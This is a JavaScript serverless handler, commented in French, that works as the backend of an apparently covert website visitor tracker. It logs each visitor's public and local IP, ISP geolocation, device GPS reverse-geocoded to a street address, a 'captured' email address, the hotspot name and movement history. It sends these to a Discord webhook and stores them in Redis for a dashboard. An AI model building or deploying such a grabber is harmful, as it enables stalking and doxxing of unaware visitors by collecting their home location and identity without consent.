import { createClient } from 'redis';

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Méthode non autorisée' });
  }

  // Connexion Redis/KV
  const redisUrl = process.env.REDIS_URL || process.env.KV_URL;
  let client = null;

  if (redisUrl) {
    client = createClient({ 
      url: redisUrl,
      socket: {
        connectTimeout: 5000,
        reconnectStrategy: false
      }
    });
    client.on('error', (err) => console.error('Redis Client Error', err));
    try {
      await client.connect();
    } catch (e) {
      console.error("Échec connexion Redis dans log.js:", e);
      client = null; // On continue sans Redis pour Discord
    }
  }

  const forwarded = req.headers['x-forwarded-for'];
  const publicIp = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress;
  
  let geo = {};
  try {
    // Utilisation d'un service plus précis avec plus de détails
    const geoRes = await fetch(`http://ip-api.com/json/${publicIp}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,mobile,proxy,hosting,query`);
    geo = await geoRes.json();
  } catch (e) {
    console.error("Erreur géo:", e);
  }

  const { sessionId, isUpdate, forceDiscord, localIp, preciseLocation, deviceStats, userAgent, language, screenResolution, referrer, page, status } = req.body;

  // --- GESTION DE LA PERSISTANCE REDIS (GOD VERSION) ---
  if (client) {
    try {
      // On marque la session comme active
      await client.sAdd('active_sessions', sessionId);
      // On met à jour l'horodatage de dernière vue
      await client.set(`session_last_seen:${sessionId}`, Date.now().toString());
      // On expire la session après 24h d'inactivité
      await client.expire(`session_last_seen:${sessionId}`, 86400);
      
      if (deviceStats?.email) {
        await client.set(`session_email:${sessionId}`, deviceStats.email);
      }

      // On enregistre le mouvement/historique
      const historyEntry = JSON.stringify({
        timestamp: Date.now(),
        page: page || 'background',
        status: status || 'online'
      });
      await client.lPush(`session_history:${sessionId}`, historyEntry);
      await client.lTrim(`session_history:${sessionId}`, 0, 99); // Garde les 100 derniers événements
    } catch (e) {
      console.error("Erreur Redis log:", e);
    }
  }

  // --- FILTRAGE DES INFOS BIDON ---
  let validatedLocalIp = localIp;
  // On compare aussi avec l'IP publique pour éviter les doublons inutiles
  if (!localIp || localIp === publicIp || localIp === '192.0.0.2' || localIp.includes('.local') || localIp === '0.0.0.0' || localIp.includes('Inconnue')) {
    validatedLocalIp = "Masquée (Protégée)";
  }

  function normalizeCoords(lat, lon) {
    let la = parseFloat(lat);
    let lo = parseFloat(lon);
    if (Number.isNaN(la) || Number.isNaN(lo)) return { lat: null, lon: null };
    if (Math.abs(la) > 90 && Math.abs(lo) <= 90) {
      const tmp = la;
      la = lo;
      lo = tmp;
    }
    return { lat: la, lon: lo };
  }

  const ipCoords = normalizeCoords(geo.lat, geo.lon);
  const ispName = geo.isp || geo.org || 'ISP inconnu';
  const ipLocationLabel = geo.status === 'success'
    ? `${geo.city || 'Inconnue'}, ${geo.regionName || ''}, ${geo.country || ''} (via IP / ${ispName})`.replace(/,\s*,/g, ',').trim()
    : `Inconnue (via IP / ${ispName})`;

  // Validation stricte de la localisation précise (GPS appareil)
  const hasGps = preciseLocation
    && typeof preciseLocation.lat === 'number'
    && typeof preciseLocation.lon === 'number'
    && preciseLocation.lat !== 0;

  const gpsCoords = hasGps
    ? normalizeCoords(preciseLocation.lat, preciseLocation.lon)
    : { lat: null, lon: null };

  let displayLocation = ipLocationLabel;
  let fullAddress = ipLocationLabel;
  
  // Si on a le GPS, on essaie de trouver l'adresse complète (Reverse Geocoding)
  if (hasGps) {
    try {
      // On demande plus de détails à Nominatim pour une précision maximale (Zoom 18 est le max pour l'adresse)
      const revRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${gpsCoords.lat}&lon=${gpsCoords.lon}&addressdetails=1&zoom=18`, {
        headers: { 'User-Agent': 'SaadaaTracker/1.0' }
      });
      const revData = await revRes.json();
      if (revData && revData.address) {
        const addr = revData.address;
        const houseNumber = addr.house_number || addr.house_name || "";
        const road = addr.road || addr.pedestrian || addr.street || addr.square || "";
        const city = addr.city || addr.town || addr.village || addr.municipality || addr.suburb || addr.neighbourhood || "";
        const postcode = addr.postcode || "";
        const state = addr.state || addr.region || "";
        
        // Formatage "Numéro Rue, CodePostal Ville"
        const addressLine = `${houseNumber} ${road}`.trim();
        displayLocation = `📍 ${addressLine}, ${city} (${state})`;
        
        const parts = [addressLine, postcode, city, state, addr.country].filter(p => !!p && p.trim() !== "");
        fullAddress = parts.join(', ');
        
        if (!houseNumber) {
            fullAddress += " (Numéro non détecté — précision GPS / OpenStreetMap)";
        } else {
            fullAddress = `🏠 ${fullAddress}`;
        }
      } else {
        fullAddress = `GPS : ${gpsCoords.lat}, ${gpsCoords.lon}`;
        displayLocation = fullAddress;
      }
    } catch (e) {
      console.error("Erreur reverse géo:", e);
      fullAddress = `GPS : ${gpsCoords.lat}, ${gpsCoords.lon}`;
      displayLocation = fullAddress;
    }
  }

  const logEntry = {
    sessionId: sessionId || 'unknown',
    isUpdate: !!isUpdate,
    forceDiscord: !!forceDiscord,
    timestamp: new Date().toLocaleString('fr-FR', { timeZone: 'Europe/Paris' }),
    unixTime: Date.now(),
    publicIp,
    localIp: validatedLocalIp,
    location: displayLocation,
    postalAddress: fullAddress,
    ipLocation: ipLocationLabel,
    email: deviceStats?.email || null,
    hotspotName: deviceStats?.networkName || null,
    isp: ispName,
    coords: hasGps
      ? `${gpsCoords.lat}, ${gpsCoords.lon}`
      : `${ipCoords.lat ?? '?'}, ${ipCoords.lon ?? '?'}`,
    accuracy: hasGps ? preciseLocation.accuracy : null,
    deviceStats: deviceStats || {},
    isPrecise: hasGps,
    userAgent,
    language,
    screenResolution,
    referrer,
    page: page || 'Inconnue'
  };

  console.log('NOUVELLE VISITE CAPTURÉE:', JSON.stringify(logEntry, null, 2));

  // Envoi vers Discord (Si première visite OU si forcé par l'admin)
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  const shouldSendToDiscord = webhookUrl && (
    logEntry.forceDiscord === true || 
    isUpdate === false || 
    isUpdate === undefined || 
    isUpdate === "false"
  );

  if (shouldSendToDiscord) {
    const cleanCoords = logEntry.coords.replace(/\s/g, '');
    const mapsLink = `https://www.google.com/maps?q=${cleanCoords}`;
    
    const locValue = logEntry.isPrecise 
      ? `✅ **GPS (appareil)**\n**${logEntry.location}**\n\n📍 [Google Maps](${mapsLink})\nCoords: \`${logEntry.coords}\`` 
      : `⚠️ **Approximatif (IP fournisseur)**\n**${logEntry.ipLocation}**\nCoords: \`${logEntry.coords}\``;

    const fields = [
      { name: "🕒 Date (Paris)", value: logEntry.timestamp, inline: true },
      { name: "🌐 IP Publique", value: `\`${publicIp}\``, inline: true },
      { name: "🏠 IP Locale (LAN)", value: `\`${validatedLocalIp}\``, inline: true },
      { name: "📡 Fournisseur (ISP)", value: logEntry.isp, inline: true },
      { name: logEntry.isPrecise ? "📍 Position GPS" : "📍 Position IP (FAI)", value: locValue }
    ];

    if (logEntry.isPrecise) {
      fields.push({ name: "🏠 Adresse GPS", value: `\`${logEntry.postalAddress}\`` });
      fields.push({ name: "🌐 Zone IP (FAI)", value: logEntry.ipLocation });
    }

    if (logEntry.email) {
      fields.push({ name: "📧 Email Capturé", value: `\`${logEntry.email}\``, inline: true });
    }

    if (logEntry.hotspotName) {
      fields.push({ name: "📶 Partage Connexion", value: `\`${logEntry.hotspotName}\``, inline: true });
    }

    fields.push(
      { name: "📄 Page", value: logEntry.page },
      { name: "🆔 Session", value: `\`${logEntry.sessionId}\``, inline: true }
    );

    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "🚀 Nouvelle Visite sur le Site !",
            color: logEntry.isPrecise ? 0x00FF00 : 0xFFA500,
            fields: fields,
            footer: { text: "Tracker IP Ultra-Précis - Saadaa le Goat" }
          }]
        })
      });
    } catch (e) {
      console.error("Erreur Webhook Discord:", e);
    }
  }

  // Stockage pour le dashboard (Redis Cloud)
  if (client) {
    try {
      // VÉRIFIER SI L'IP EST TUÉE ET SI C'EST UN UPDATE
      // Les updates (pings auto) sont bloqués pour les IPs tuées (PERMANENT)
      // Mais les premières visites (isUpdate=false) passent pour permettre un retour
      const isIpKilled = await client.sIsMember('ip_kill', publicIp);
      
      if (isIpKilled && isUpdate) {
        console.log(`🚫 IP tuée (update ignoré): ${publicIp}`);
        await client.quit();
        return res.status(200).json({ success: true, ip: publicIp, message: "IP tuée - update ignoré" });
      }
      
      // 1. Log général
      const logLine = `[${logEntry.timestamp}] IP:${publicIp} | Local:${validatedLocalIp} | Loc:${logEntry.location} | Session:${logEntry.sessionId}\n`;
      await client.lPush('visitor_logs', logLine);

      // 2. Historique de mouvement pour cette session
      const movementData = JSON.stringify({
        publicIp: publicIp,
        lat: hasGps ? gpsCoords.lat : ipCoords.lat,
        lon: hasGps ? gpsCoords.lon : ipCoords.lon,
        ipLat: ipCoords.lat,
        ipLon: ipCoords.lon,
        accuracy: logEntry.accuracy,
        deviceStats: logEntry.deviceStats,
        time: logEntry.timestamp,
        unixTime: logEntry.unixTime,
        isPrecise: logEntry.isPrecise,
        geoSource: hasGps ? 'gps' : 'ip',
        localIp: validatedLocalIp,
        postalAddress: logEntry.postalAddress,
        ipLocation: logEntry.ipLocation,
        isp: logEntry.isp,
        email: logEntry.email,
        hotspotName: logEntry.hotspotName,
        page: logEntry.page,
        userAgent: logEntry.userAgent
      });
      await client.rPush(`session_movement:${logEntry.sessionId}`, movementData);

      if (logEntry.email) {
        await client.set(`session_email:${logEntry.sessionId}`, logEntry.email);
      }
      await client.set(`session_last_seen:${logEntry.sessionId}`, String(logEntry.unixTime), { EX: 86400 * 30 });
      
      // 3. Liste des sessions actives
      // Les vraies visites (isUpdate=false) réactivent TOUJOURS la session
      // Les pings auto s'ajoutent seulement si pas tuée
      if (isUpdate === false || !isIpKilled) {
        await client.sAdd('active_sessions', logEntry.sessionId);
      }

    } catch (e) {
      console.error("Erreur Stockage Redis:", e);
    } finally {
      await client.quit();
    }
  }

  return res.status(200).json({ success: true, ip: publicIp });
}
